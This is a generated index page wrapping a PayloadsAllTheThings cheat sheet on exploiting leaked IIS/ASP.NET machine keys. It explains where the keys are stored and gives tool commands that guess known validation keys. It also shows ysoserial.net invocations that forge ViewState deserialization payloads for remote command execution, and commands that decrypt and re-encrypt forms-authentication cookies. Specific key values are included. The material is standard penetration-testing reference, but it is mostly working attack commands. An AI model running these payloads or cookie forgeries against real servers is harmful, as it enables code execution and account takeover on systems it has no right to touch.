---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# IIS Machine Keys

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-api-key-leaks-iis-machine-keys` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/API Key Leaks/IIS-Machine-Keys.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [IIS Machine Keys](../../topics/api-key-leaks/iis-machine-keys.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-api-key-leaks-iis-machine-keys |
| name | IIS Machine Keys |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/API%20Key%20Leaks/IIS-Machine-Keys.md |

## Preserved Source Material

````yaml
_body: "# IIS Machine Keys\n\n> That machine key is used for encryption and decryption of forms authentication cookie data\
  \ and view-state data, and for verification of out-of-process session state identification.\n\n## Summary\n\n* [Viewstate\
  \ Format](#viewstate-format)\n* [Machine Key Format And Locations](#machine-key-format-and-locations)\n* [Identify Known\
  \ Machine Key](#identify-known-machine-key)\n* [Decode ViewState](#decode-viewstate)\n* [Generate ViewState For RCE](#generate-viewstate-for-rce)\n\
  \    * [MAC Is Not Enabled](#mac-is-not-enabled)\n    * [MAC Is Enabled And Encryption Is Disabled](#mac-is-enabled-and-encryption-is-disabled)\n\
  \    * [MAC Is Enabled And Encryption Is Enabled](#mac-is-enabled-and-encryption-is-enabled)\n* [Edit Cookies With The Machine\
  \ Key](#edit-cookies-with-the-machine-key)\n* [References](#references)\n\n## Viewstate Format\n\nViewState in IIS is a\
  \ technique used to retain the state of web controls between postbacks in ASP.NET applications. It stores data in a hidden\
  \ field on the page, allowing the page to maintain user input and other state information.\n\n| Format | Properties |\n\
  | --- | --- |\n| Base64 | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |\n| Base64 + MAC | `EnableViewStateMac=True`\
  \ |\n| Base64 + Encrypted | `ViewStateEncryptionMode=True` |\n\nBy default until Sept 2014, the `enableViewStateMac` property\
  \ was to set to `False`.\nUsually unencrypted viewstate are starting with the string `/wEP`.\n\n## Machine Key Format And\
  \ Locations\n\nA machineKey in IIS is a configuration element in ASP.NET that specifies cryptographic keys and algorithms\
  \ used for encrypting and validating data, such as view state and forms authentication tokens. It ensures consistency and\
  \ security across web applications, especially in web farm environments.\n\nThe format of a machineKey is the following.\n\
  \n```xml\n<machineKey validationKey=\"[String]\"  decryptionKey=\"[String]\" validation=\"[SHA1 (default) | MD5 | 3DES |\
  \ AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]\"  decryption=\"[Auto (default) | DES | 3DES | AES |\
  \ alg:algorithm_name]\" />\n```\n\nThe `validationKey` attribute specifies a hexadecimal string used to validate data, ensuring\
  \ it hasn't been tampered with.\n\nThe `decryptionKey` attribute provides a hexadecimal string used to encrypt and decrypt\
  \ sensitive data.\n\nThe `validation` attribute defines the algorithm used for data validation, with options like SHA1,\
  \ MD5, 3DES, AES, and HMACSHA256, among others.\n\nThe `decryption` attribute specifies the encryption algorithm, with options\
  \ like Auto, DES, 3DES, and AES, or you can specify a custom algorithm using alg:algorithm_name.\n\nThe following example\
  \ of a machineKey is from [Microsoft documentation](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication).\n\
  \n```xml\n<machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\"\
  \ decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" />\n```\n\nCommon locations of\
  \ **web.config** / **machine.config**\n\n* 32-bits\n    * `C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config`\n\
  \    * `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config`\n* 64-bits\n    * `C:\\Windows\\Microsoft.NET\\\
  Framework64\\v4.0.30319\\config\\machine.config`\n    * `C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config`\n\
  * in the registry when **AutoGenerate** is enabled (extract with [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab))\n\
  \    * `HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4`  \n    * `HKEY_CURRENT_USER\\Software\\\
  Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey`\n\n## Identify Known Machine Key\n\nTry multiple machine keys from known products,\
  \ Microsoft documentation, or other part of the Internet.\n\n* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)\n\
  \n    ```powershell\n    ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt\n    ____   ____.__ \
  \                      __         .__   __\n    \\   \\ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________\
  \ \n    \\   Y   / |  |/ __ \\ \\/ \\/ /  ___/\\   __\\__  \\ |  | |  |/ // __ \\_  __ \\\n    \\     /  |  \\  ___/\\ \
  \    /\\___ \\  |  |  / __ \\|  |_|    <\\  ___/|  | \\/\n    \\___/   |__|\\___  >\\/\\_//____  > |__| (____  /____/__|_\
  \ \\\\___  >__|   \n                    \\/           \\/            \\/          \\/    \\/       \n\n    KEY FOUND!!!\n\
  \    Host:   \n    Validation Key: XXXXX,XXXXX\n    ```\n\n* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)\n\
  \n    ```ps1\n    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6\n    Matching MachineKeys\
  \ found!\n    validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE\
  \ validationAlgo: SHA1\n    ```\n\n* [irsdl/crapsecrets](https://github.com/irsdl/crapsecrets)\n\n    ```ps1\n    python3\
  \ ./crapsecrets/examples/cli.py -u http://update.microsoft.com/ -r\n    python3 ./crapsecrets/examples/cli.py -u http://update.microsoft.com/\
  \ -mrd 5\n    python3 ./crapsecrets/examples/cli.py -mrd 5 -avsk -fvsp -u http://update.microsoft.com/\n    python3 ./crapsecrets/examples/cli.py\
  \ -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -u http://10.10.10.10:8080/\n    python3 ./crapsecrets/examples/cli.py\
  \ -mrd 5 -avsk -fvsp -mkf ./local/aspnet_machinekeys_local.txt -mkf ./crapsecrets/resources/aspnet_machinekeys.txt -u http://10.10.10.10:8080/a1/b/c1/\n\
  \    ```\n\n* [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)\n\n    ```powershell\n    AspDotNetWrapper.exe\
  \ --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=\
  \ --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n    ```\n\n* [0xacb/viewgen](https://github.com/0xacb/viewgen)\n\
  \n    ```powershell\n    $ viewgen --guess \"/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\"\n    [+] ViewState is not\
  \ encrypted\n    [+] Signature algorithm: SHA1\n    ```\n\nList of interesting machine keys to use:\n\n* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)\n\
  * [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)\n\
  * [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)\n\
  \n## Decode ViewState\n\n* [BApp Store > ViewState Editor](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc)\
  \ - ViewState Editor is an extension that allows you to view and edit the structure and contents of V1.1 and V2.0 ASP view\
  \ state data.\n* [0xacb/viewgen](https://github.com/0xacb/viewgen)\n\n    ```powershell\n    viewgen --decode --check --webconfig\
  \ web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\"\
  \n    ```\n\n## Generate ViewState For RCE\n\nFirst you need to decode the Viewstate to know if the MAC and the encryption\
  \ are enabled.\n\n**Requirements**:\n\n* `__VIEWSTATE`\n* `__VIEWSTATEGENERATOR`\n\n### MAC Is Not Enabled\n\n```ps1\nysoserial.exe\
  \ -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"cmd /c whoami\"\n```\n\n### MAC Is Enabled And Encryption\
  \ Is Disabled\n\n* Find the machine key (validationkey) using `badsecrets`, `viewstalker`, `AspDotNetWrapper.exe` or `viewgen`\n\
  \n    ```ps1\n    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs=\
  \ --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy\n    # --modifier = `__VIEWSTATEGENERATOR`\
  \ parameter value\n    # --encrypteddata = `__VIEWSTATE` parameter value of the target application\n    ```\n\n* Then generate\
  \ a ViewState using [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net), both `TextFormattingRunProperties`\
  \ and `TypeConfuseDelegate` gadgets can be used.\n\n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties\
  \ -c \"cmd /c whoami\" --generator=CA0B0334 --validationalg=\"SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\
  \n    .\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --generator=3E92B2D6 --validationalg=\"\
  SHA1\" --validationkey=\"C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45\"\
  \n\n    # --generator = `__VIEWSTATEGENERATOR` parameter value\n    # --validationkey = validation key from the previous\
  \ command\n    ```\n\n### MAC Is Enabled And Encryption Is Enabled\n\nDefault validation algorithm is `HMACSHA256` and the\
  \ default decryption algorithm is `AES`.\n\nIf the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework\
  \ version 4.0 or below, you can use the root of the app (e.g: `--apppath=\"/testaspx/\"`).\n\n* **.NET Framework < 4.5**,\
  \ ASP.NET always accepts an unencrypted `__VIEWSTATE` if you remove the `__VIEWSTATEENCRYPTED` parameter from the request\n\
  \n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"cmd /c whoami\" --apppath=\"/testaspx/\" --islegacy\
  \ --validationalg=\"SHA1\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\"\
  \ --isdebug\n    ```\n\n* **.NET Framework > 4.5**, the machineKey has the property: `compatibilityMode=\"Framework45\"\
  `\n\n    ```ps1\n    .\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/somepath/testaspx/test.aspx\"\
  \ --apppath=\"/testaspx/\" --decryptionalg=\"AES\" --decryptionkey=\"34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887\"\
  \ --validationalg=\"HMACSHA256\" --validationkey=\"70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0\"\
  \n    ```\n\n## Edit Cookies With The Machine Key\n\nIf you have the `machineKey` but the viewstate is disabled.\n\nASP.net\
  \ Forms Authentication Cookies : [liquidsec/aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools)\n\n```powershell\n\
  # decrypt cookie\n$ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie\
  \ --valalgo=hmacsha512 --decalgo=aes\n\n# encrypt cookie (edit Decrypted.txt)\n$ AspDotNetWrapper.exe --decryptDataFilePath\
  \ C:\\DecryptedText.txt\n```\n\n## References\n\n* [Deep Dive into .NET ViewState Deserialization and Its Exploitation -\
  \ Swapneil Kumar Dash - October 22, 2019](https://web.archive.org/web/20250916225422/https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\n\
  * [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili - April 23, 2019](https://web.archive.org/web/20250806010506/https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)\n\
  * [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net - Claranet - June 13, 2019](https://web.archive.org/web/20250810191756/https://www.claranet.com/us/blog/2019-06-13-exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserialnet)\n\
  * [Project Blacklist3r - @notsosecure - November 23, 2018](https://web.archive.org/web/20260116051627/https://notsosecure.com/project-blacklist3r)\n\
  * [View State, The Unpatchable IIS Forever Day Being Actively Exploited - Zeroed - July 21, 2024](https://web.archive.org/web/20260107194152/https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/)"
_relative_path: API Key Leaks/IIS-Machine-Keys.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/API Key Leaks/IIS-Machine-Keys.md
````
